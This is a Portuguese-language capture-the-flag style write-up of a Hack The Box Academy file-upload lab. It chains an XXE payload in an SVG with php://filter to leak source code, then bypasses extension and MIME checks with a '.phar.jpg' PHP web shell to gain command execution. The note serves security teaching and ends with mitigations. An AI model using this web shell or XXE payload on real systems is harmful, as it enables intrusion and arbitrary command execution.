<div align="center">

# 🗂️ File Upload Attacks — Skills Assessment

### HTB Academy | Módulo: File Upload Attacks

![HTB](https://img.shields.io/badge/Hack%20The%20Box-Academy-9FEF00?style=for-the-badge&logo=hackthebox&logoColor=white)
![Category](https://img.shields.io/badge/Category-Web%20Application%20Security-blue?style=for-the-badge)
![Difficulty](https://img.shields.io/badge/Status-Completed-success?style=for-the-badge)
![CPTS/CWES](https://img.shields.io/badge/Track-CPTS/CWES-red?style=for-the-badge)

</div>

---

## 📑 Sumário

- [Objetivo](#-objetivo)
- [Ambiente e Ferramentas](#-ambiente-e-ferramentas)
- [Metodologia](#-metodologia)
  - [Fase 1 — Reconhecimento](#fase-1--reconhecimento)
  - [Fase 2 — Enumeração de Filtros de Upload](#fase-2--enumeração-de-filtros-de-upload)
  - [Fase 3 — Falha na Descoberta do Diretório](#fase-3--falha-na-descoberta-do-diretório)
  - [Fase 4 — Mudança de Estratégia: XXE via SVG](#fase-4--mudança-de-estratégia-xxe-via-svg)
  - [Fase 5 — Disclosure do Código-Fonte](#fase-5--disclosure-do-código-fonte)
  - [Fase 6 — Análise das Validações](#fase-6--análise-das-validações)
  - [Fase 7 — Construção do Payload Bypass](#fase-7--construção-do-payload-bypass)
  - [Fase 8 — Remote Code Execution](#fase-8--remote-code-execution)
  - [Fase 9 — Captura da Flag](#fase-9--captura-da-flag)
- [Cadeia Completa de Exploração](#-cadeia-completa-de-exploração)
- [Vulnerabilidades Identificadas](#-vulnerabilidades-identificadas)
- [Medidas de Mitigação](#-medidas-de-mitigação)
- [Lições Aprendidas](#-lições-aprendidas)
- [Skills Demonstradas](#-skills-demonstradas)
- [Disclaimer Ético](#-disclaimer-ético)

---

## 🎯 Objetivo

Identificar e explorar uma vulnerabilidade de upload de arquivos capaz de resultar em **Remote Code Execution (RCE)** no servidor da aplicação alvo, culminando na recuperação da flag do laboratório.

Diferente de cenários de upload "diretos", este assessment exigiu o encadeamento de **múltiplas vulnerabilidades** como reconhecimento, fuzzing, bypass de filtros, XXE e engenharia reversa de código-fonte para transformar um cenário inicialmente cego (black-box) em um cenário de caixa branca (white-box).

---

## 🛠️ Ambiente e Ferramentas

| Ferramenta | Finalidade |
|---|---|
| Burp Suite | Interceptação e manipulação de requisições HTTP |
| Wordlists customizadas | Fuzzing de diretórios de upload |
| `php://filter` | Disclosure de código-fonte via wrapper PHP |
| XML/SVG payloads | Exploração de XXE |
| Web Shell (PHP) | Execução remota de comandos |

---

## 🔍 Metodologia

### Fase 1 — Reconhecimento

A aplicação (denominada **Uploads Shop**) expunha uma única funcionalidade relacionada a uploads, localizada em:

```
/contact/
```

Um formulário de feedback permitia o envio de uma imagem como anexo, ponto de entrada natural para testes de upload.

> <img src="https://i.imgur.com/zKl5nHF.png"/>

---

### Fase 2 — Enumeração de Filtros de Upload

Foram testadas diversas extensões PHP alternativas na tentativa de identificar bypasses triviais de filtro:

```
.phtml
.phar
.pht
.php5
.php7
.pcap
```

Algumas dessas extensões conseguiram passar pela validação inicial de upload, porém, sem visibilidade sobre onde o arquivo era armazenado, não havia como confirmar a execução do payload.

> <img src="https://i.imgur.com/0tNjALm.png"/>

---

### Fase 3 — Falha na Descoberta do Diretório

Foi realizado fuzzing em busca de diretórios públicos de upload, utilizando wordlists com caminhos comuns:

```
/uploads/
/upload/
/images/
/img/
/assets/
/files/
/media/
```

**Resultado:** nenhum diretório acessível foi encontrado. Ficou claro que o desafio não estava apenas em burlar o filtro de upload, mas em **descobrir onde os arquivos eram armazenados** e **como eram renomeados**.

---

### Fase 4 — Mudança de Estratégia: XXE via SVG

Capturando a requisição de upload no Burp Suite, foi identificado o endpoint de processamento:

```http
POST /contact/upload.php HTTP/1.1
Content-Type: multipart/form-data
```

Como o módulo abordava **Limited File Uploads**, a hipótese seguinte foi explorar **XXE (XML External Entity)** através do upload de um arquivo SVG:

```
image.svg
```

Payload XXE inicial (leitura de `index.php`):

```xml
<!ENTITY xxe SYSTEM
"php://filter/convert.base64-encode/resource=index.php">
```

O conteúdo obtido não trouxe informações relevantes.

> <img src="https://i.imgur.com/HO5NhDW.png"/>

---

### Fase 5 — Disclosure do Código-Fonte

O payload foi ajustado para apontar diretamente ao endpoint responsável pelo processamento de uploads:

```xml
<!ENTITY xxe SYSTEM
"php://filter/convert.base64-encode/resource=upload.php">
```

Após decodificar o retorno em Base64, o **código-fonte completo de `upload.php`** foi recuperado, o ponto de virada do assessment.

> <img src="https://i.imgur.com/6kDVoeL.png"/>

---

### Fase 6 — Análise das Validações

A análise do código revelou todas as camadas de proteção implementadas:

**Diretório de upload:**
```php
$target_dir = "./user_feedback_submissions/";
```

**Renomeação automática (padrão previsível):**
```php
$fileName = date('ymd') . '_' . basename($_FILES["uploadFile"]["name"]);
// Exemplo: 260710_image.jpg
```

**Blacklist (incompleta):**
```php
if (preg_match('/.+\.ph(p|ps|tml)/', $fileName))
// Bloqueia apenas: .php, .phps, .phtml
```

**Whitelist (regex insuficiente):**
```php
if (!preg_match('/^.+\.[a-z]{2,3}g$/', $fileName))
// Permite: image.jpg, image.png, image.svg.jpg, image.phar.jpg
```

**Validações adicionais:**
```php
$_FILES["uploadFile"]["type"]   // Content-Type validado
mime_content_type()             // MIME-Type validado
```

---

### Fase 7 — Construção do Payload Bypass

Com todas as regras mapeadas, o objetivo passou a ser construir um arquivo que satisfizesse **simultaneamente** whitelist, blacklist, Content-Type e MIME-Type.

Extensão escolhida: **`.phar.jpg`**

| Validação | Motivo do bypass |
|---|---|
| Blacklist | `.phar` não consta na lista bloqueada |
| Whitelist | Nome termina em `.jpg`, casando com o regex `[a-z]{2,3}g$` |
| Content-Type | Definido manualmente como `image/jpeg` |
| MIME-Type | Assinatura JPEG (`ÿØ`) incluída no início do arquivo |

Estrutura do arquivo malicioso:

```
Content-Disposition: filename="image.phar.jpg"
Content-Type: image/jpeg

<?php system($_REQUEST['cmd']); ?>
```

> <img src="https://i.imgur.com/OFS0LfX.png"/>

---

### Fase 8 — Remote Code Execution

Com o algoritmo de renomeação já conhecido (`YYMMDD_nomeOriginal`), o arquivo foi acessado diretamente:

```
/contact/user_feedback_submissions/260710_image.phar.jpg?cmd=id
```

**Resultado:**

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

✅ **RCE confirmado** — o servidor executava comandos arbitrários através do web shell.

> <img src="https://i.imgur.com/7xY1j26.png"/>

---

### Fase 9 — Captura da Flag

Com o web shell funcional, a flag foi lida diretamente do sistema de arquivos, concluindo o laboratório com sucesso.

> <img src="https://i.imgur.com/DlS1O21.png"/>

---

## 🔗 Cadeia Completa de Exploração

```
Reconhecimento
      │
      ▼
Enumeração de extensões
      │
      ▼
Falha em localizar diretório de uploads
      │
      ▼
Upload SVG (disfarçado de imagem)
      │
      ▼
Exploração de XXE
      │
      ▼
Leitura do código-fonte de upload.php
      │
      ▼
Descoberta das validações (blacklist/whitelist/MIME)
      │
      ▼
Descoberta do diretório de armazenamento
      │
      ▼
Descoberta do algoritmo de renomeação
      │
      ▼
Bypass simultâneo de blacklist, whitelist e MIME-Type
      │
      ▼
Upload do web shell
      │
      ▼
Remote Code Execution
      │
      ▼
Leitura da flag
```

---

## ⚠️ Vulnerabilidades Identificadas

- **XML External Entity (XXE)** permitindo leitura arbitrária de arquivos no servidor
- Exposição de código-fonte da aplicação via wrapper `php://filter`
- Blacklist de extensões PHP incompleta
- Regex de whitelist insuficiente, permitindo extensões compostas (`.phar.jpg`)
- Diretório de uploads acessível publicamente
- Ausência de bloqueio de execução de scripts no diretório de uploads
- Possibilidade de **Remote Code Execution (RCE)**

---

## 🛡️ Medidas de Mitigação

- Desabilitar o processamento de entidades externas (XXE) no parser XML
- Adotar whitelist rigorosa de extensões (allow-list explícita, não regex genérico)
- Validar extensão, MIME-Type **e** assinatura de arquivo (magic bytes) simultaneamente
- Armazenar uploads fora da raiz pública do servidor
- Servir arquivos exclusivamente através de um endpoint controlado, sem execução direta
- Bloquear a execução de scripts no diretório de uploads (ex: configuração `.htaccess` / Nginx `location`)
- Randomizar nomes de arquivos (evitar padrões previsíveis como data + nome original)
- Aplicar o princípio do menor privilégio ao processo do servidor web
- Implementar inspeção/antivírus para arquivos enviados

---

## 📚 Lições Aprendidas

Este assessment reforçou que vulnerabilidades de upload raramente dependem de um único bypass isolado. O caminho até o RCE exigiu o encadeamento de:

1. Enumeração e fuzzing
2. Bypass parcial de filtros
3. Exploração de XXE
4. Disclosure de código-fonte
5. Engenharia reversa da lógica de validação
6. Construção de um payload compatível com **todas** as camadas de proteção simultaneamente

O uso do XXE foi o divisor de águas: transformou um cenário cego em um cenário de caixa branca, permitindo compreender exatamente como a aplicação processava os arquivos — e só então construir o exploit definitivo.

---

## 🎓 Skills Demonstradas

- Web Application Penetration Testing
- File Upload Attacks & Filter Bypass Techniques
- XML External Entity (XXE) Exploitation
- Source Code Disclosure via `php://filter`
- Manual Code Review / White-box Analysis
- Burp Suite (Repeater, Intruder)
- Multi-stage Vulnerability Chaining
- Remote Code Execution (RCE)

---

## ⚖️ Disclaimer Ético

Este write-up documenta uma atividade realizada em ambiente **controlado e autorizado** do Hack The Box Academy, como parte da trilha de certificação **CPTS (Certified Penetration Testing Specialist)**. Todas as técnicas descritas têm fins exclusivamente educacionais e não devem ser aplicadas contra sistemas sem autorização expressa. O autor não se responsabiliza pelo uso indevido das informações aqui contidas.

---

<div align="center">

**Conectado ao progresso da certificação CPTS** 🎯

</div>
